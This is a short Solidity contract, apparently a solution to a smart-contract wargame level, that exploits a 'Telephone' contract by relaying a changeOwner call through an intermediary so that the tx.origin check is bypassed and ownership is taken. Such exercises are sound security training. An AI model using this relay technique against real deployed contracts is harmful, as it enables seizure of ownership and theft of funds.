// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract AttackTelephone {
    Telephone public victim;

    constructor(address _telephone) public {
        victim = Telephone(_telephone);
    }

    function changeOwner() public {
        victim.changeOwner(msg.sender);
    }
}
